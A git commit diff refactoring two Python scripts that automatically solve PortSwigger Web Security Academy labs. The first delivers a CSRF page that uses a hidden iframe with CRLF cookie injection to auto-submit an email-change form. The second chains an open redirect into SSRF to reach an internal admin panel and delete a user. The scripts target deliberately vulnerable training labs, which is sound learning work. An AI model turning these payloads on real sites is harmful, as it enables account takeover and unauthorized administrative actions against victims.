06c6c002cb4b0649b71a9ae81b80b72d7a13e6df
santino locanto <santino.locanto2015@libero.it>
2022-12-01 17:10:22 +0100

    modified scripts

--- Script_1/script_1.py
+++ Script_1/script_1.py
@@ -1,78 +1,134 @@
 import typer
 from lxml import html
 from requests import Session
+import requests
 
 from rich.console import Console
+from valid8 import validate
+import re
+from typing import Callable
 
-SERVER = "https://0ac5007904eb50e0c0c81400006f0094.web-security-academy.net"
-
-INJECTED_HTML = f"<form id=\"email-form\" action=\"{SERVER}/my-account/change-email\" method=\"POST\">" \
-                "<label>Email</label>" \
-                "<input required="" type=\"email\" name=\"email\" value=\"prova@example.com\">" \
-                "<input required="f" type=\"hidden\" name=\"csrf\" value=\"ciaoatutti\">" \
-                "</form>" \
-                f"<iframe style=\"display:none\" src=\"{SERVER}/?search=foo%0ASet%2DCookie%3A%20csrf%3Dciaoatutti%3B%20SameSite%3DNone\" onload=\"document.getElementById('email-form').submit();\"></iframe>"
-
-console = Console()
 app = typer.Typer()
+console = Console()
+session = Session()
 
 
-def login(session):
-    response = session.get(f"{SERVER}/login")
+def pattern(regex: str) -> Callable[[str], bool]:
+    r = re.compile(regex)
+
+    def res(value):
+        return bool(r.fullmatch(value))
+
+    res.__name__ = f'pattern({regex})'
+    return res
+
+
+def login(server):
+    response = session.get(f"{server}/login")
     html_document = html.fromstring(response.content)
     csrf_token = html_document.xpath("//section/form/input[@name='csrf']/@value")[0]
     console.log(f"CSRF Token: {csrf_token}")
-    response = session.post(f"{SERVER}/login", data={
+    response = session.post(f"{server}/login", data={
         "csrf": csrf_token,
         "username": "wiener",
         "password": "peter"
     })
+    console.log(f"Login status code: {response.history[0].status_code}")
     return response.history
 
 
-def get_exploit_server(session):
-    response = session.get(f"{SERVER}/")
+def get_exploit_server(server):
+    response = session.get(f"{server}/")
     html_document = html.fromstring(response.content)
-    exploit_server_link = html_document.xpath("//a[@id='exploit-link']/@href")[0]
-    session.get(f"{exploit_server_link}")
-    console.log(f"Exploit server status code: {response.status_code}")
-    return exploit_server_link
+    if len(html_document.xpath("//a[@id='exploit-link']/@href")) == 0:
+        return ""
+    else:
+        exploit_server_link = html_document.xpath("//a[@id='exploit-link']/@href")[0]
+        session.get(f"{exploit_server_link}")
+        console.log(f"Exploit server status code: {response.status_code}")
+        return exploit_server_link
 
 
-def exploit_server_operation(session, mode: str):
-    session.post(f"{get_exploit_server(session)}", data={
+def exploit_server_operation(mode: str, inject_html: str, server):
+    exploit_server = get_exploit_server(server)
+    response = session.post(f"{exploit_server}", data={
         "urlIsHttps": "on",
         "responseFile": "/exploit",
         "responseHead": "HTTP/1.1 200 OK\n"
                         "Content-Type: text/html; charset=utf-8",
-        "responseBody": INJECTED_HTML,
+        "responseBody": inject_html,
         "formAction": mode
     })
+    console.log(f"Get exploit server status code: {response.status_code}")
 
 
-def check_lab_solver(session):
-    response = session.get(f"{SERVER}/")
+def check_lab_solver(server):
+    response = session.get(f"{server}/")
     html_document = html.fromstring(response.content)
     solved_link = html_document.xpath("//section[@id='notification-labsolved']")
+    success_message = "Congratulations, you solved the lab!".center(100)
+    error_message = "Not Solved!".center(100)
+
     if solved_link:
-        console.log('Congratulations, you solved the lab')
+        console.print(success_message, style="blink bold white on green")
     else:
-        console.log('Not solved')
+        console.print(error_message, style="blink bold white on red")
 
 
-def main():
-    session = Session()
-    with console.status("Login..."):
-        login(session)
-    with console.status("Go to exploit server..."):
-        get_exploit_server(session)
-    with console.status("Storing..."):
-        exploit_server_operation(session, "STORE")
-    with console.status("Delivering to the victim"):
-        exploit_server_operation(session, "DELIVER_TO_VICTIM")
-    with console.status("Checking solving lab"):
-        check_lab_solver(session)
+def is_lab_solved(server):
+    return True if get_exploit_server(server) == "" else False
+
+
+def validate_server(server):
+    validate("server", server, length=65, custom=[pattern(r'\w{5}:\/\/\w{32}\.web-security-academy\.net\/*$')],
+             help_msg="Insert a valid URL from web security academy")
+
+    if requests.get(f"{server}").status_code != 200:
+        raise Exception("URL NOT VALID!")
+
+    return server
+
+
+@app.callback()
+def main(
+        server: str = typer.Option(
+            ...,
+            prompt=True,
+            envvar="SERVER",
+            help=f"Vulnerable server ID"
+        )
+
+):
+    inject_html = f"<form id=\"email-form\" action=\"{server}/my-account/change-email\" method=\"POST\">" \
+                  "<label>Email</label>" \
+                  "<input required="" type=\"email\" name=\"email\" value=\"prova@example.com\">" \
+                  "<input required="f" type=\"hidden\" name=\"csrf\" value=\"ciaoatutti\">" \
+                  "</form>" \
+                  f"<iframe style=\"display:none\" src=\"{server}/?search=foo%0ASet%2DCookie%3A%20csrf%3Dciaoatutti%3B%20SameSite%3DNone\" onload=\"document.getElementById('email-form').submit();\"></iframe>"
+
+    server = validate_server(server)
+
+    if not is_lab_solved(server):
+        with console.status("Login..."):
+            login(server)
+        with console.status("Go to exploit server..."):
+            get_exploit_server(server)
+        with console.status("Storing..."):
+            exploit_server_operation("STORE", inject_html, server)
+        with console.status("Delivering to the victim"):
+            exploit_server_operation("DELIVER_TO_VICTIM", inject_html, server)
+        with console.status("Checking solving lab"):
+            check_lab_solver(server)
+    else:
+        console.print("Challenge already solved!".center(100), style="blink bold black on yellow")
+
+
+def run():
+    try:
+        typer.run(main)
+    except Exception as e:
+        console.print(f"[red bold]Error:[/red bold] {e}")
 
 
 if __name__ == "__main__":
-    main()
+    run()
--- Script_2/script_2.py
+++ Script_2/script_2.py
@@ -1,40 +1,119 @@
 import re
+from typing import Callable
 import requests
 from rich.console import Console
 from lxml import html
 import urllib.parse
+import typer
+from valid8 import validate
 
-#code_lab = "0abd0005038b31bcc02d155d00a0002f"  # input
-SERVER = "https://0a26007904f4251cc039e642001500dd.web-security-academy.net"
 console = Console()
-response = requests.get(f"{SERVER}/")
-html_document = html.fromstring(response.content)
-product = html_document.xpath("//section/div/a[contains(@href,'/product?productId=')]/@href")[0]
-#console.log(product)
-response = requests.get(f"{SERVER}{product}")
-#console.log(response.text)
-html_document = html.fromstring(response.content)
-global_link = str(html_document.xpath("//div[@class='is-linkback']/a[contains(@href,'path=')]/@href"))
-link = re.sub(r'path=.*','path=http://192.168.0.12:8080/admin',global_link)
-link = link.replace('[\'','')
-#console.log(link)
-#console.log(urllib.parse.quote(link))
-response = requests.post(f"{SERVER}/product/stock", data={
-    'stockApi': urllib.parse.quote(link)
-})
-#console.log(response.text)
-html_document = html.fromstring(response.content)
-link = str(html_document.xpath("//div/a[contains(@href,'username=carlos')]/@href"))
-link = link.replace("/","",1)
-link = re.sub(r'path=.*','path='+link,global_link)
-link = link.replace("[","").replace("]","").replace("\'","")
-#console.log(link)
-response = requests.post(f"{SERVER}/product/stock", data={
-    'stockApi': urllib.parse.quote(link)
-})
-#console.log(response.text)
-html_document = html.fromstring(response.content)
+app = typer.Typer()
+open_redirect_link = ""
 
-link = html_document.xpath("//section[@id='notification-labsolver']")
-if link is not None:
-    console.log('You win')
+
+def pattern(regex: str) -> Callable[[str], bool]:
+    r = re.compile(regex)
+
+    def res(value):
+        return bool(r.fullmatch(value))
+
+    res.__name__ = f'pattern({regex})'
+    return res
+
+
+def fetch_product(server):
+    response = requests.get(f"{server}/")
+    html_document = html.fromstring(response.content)
+    product = html_document.xpath("//section/div/a[contains(@href,'/product?productId=')]/@href")[0]
+    console.log("Selecting product...")
+    return product
+
+
+def get_admin_page(product, server):
+    response = requests.get(f"{server}{product}")
+    console.log(f"Product page status code: {response.status_code}")
+    html_document = html.fromstring(response.content)
+    global open_redirect_link
+    open_redirect_link = str(html_document.xpath("//div[@class='is-linkback']/a[contains(@href,'path=')]/@href")[0])
+    link = re.sub(r'path=.*', 'path=http://192.168.0.12:8080/admin', open_redirect_link)
+    admin_page = requests.post(f"{server}/product/stock", data={
+        'stockApi': urllib.parse.quote(link)
+    })
+    console.log(f"Get Admin Page Status code: {admin_page.status_code}")
+    return admin_page
+
+
+def delete_user(admin_page, server):
+    html_document = html.fromstring(admin_page.content)
+    link = str(html_document.xpath("//div/a[contains(@href,'username=carlos')]/@href")[0])[1:]
+    link = re.sub(r'path=.*', 'path=' + link, open_redirect_link)
+
+    response = requests.post(f"{server}/product/stock", data={
+        'stockApi': urllib.parse.quote(link)
+    })
+    console.log(f"Deleting user status code: {response.status_code}")
+
+
+def check_lab_solver(server):
+    response = requests.get(f"{server}/")
+    html_document = html.fromstring(response.content)
+    solved_link = html_document.xpath("//section[@id='notification-labsolved']")
+    success_message = "Congratulations, you solved the lab!".center(100)
+    error_message = "Not Solved!".center(100)
+
+    if solved_link:
+        console.print(success_message, style="blink bold white on green")
+    else:
+        console.print(error_message, style="blink bold white on red")
+
+
+def is_lab_solved(server):
+    response = requests.get(f"{server}/")
+    html_document = html.fromstring(response.content)
+    solved_link = html_document.xpath("//section[@id='notification-labsolved']")
+    return True if solved_link else False
+
+
+def validate_server(server):
+    validate("server", server, length=65, custom=[pattern(r'\w{5}:\/\/\w{32}\.web-security-academy\.net$')],
+             help_msg="Insert a valid URL from web security academy")
+
+    if requests.get(f"{server}").status_code != 200:
+        raise Exception("URL NOT VALID!")
+
+    return server
+
+
+@app.callback()
+def main(
+        server: str = typer.Option(
+            ...,
+            prompt=True,
+            envvar="SERVER",
+            help=f"Vulnerable server ID"
+        )
+):
+    server = validate_server(server)
+    if not is_lab_solved(server):
+        with console.status("Fetching product..."):
+            product = fetch_product(server)
+        with console.status("Go to admin page"):
+            admin_page = get_admin_page(product, server)
+        with console.status("Deleting user Carlos..."):
+            delete_user(admin_page, server)
+        with console.status("Checking solving lab"):
+            check_lab_solver(server)
+    else:
+        console.print("Challenge already solved!".center(100), style="blink bold black on yellow")
+
+
+def run():
+    try:
+        typer.run(main)
+    except Exception as e:
+        console.print(f"[red bold]Error:[/red bold] {e}")
+
+
+if __name__ == "__main__":
+    run()
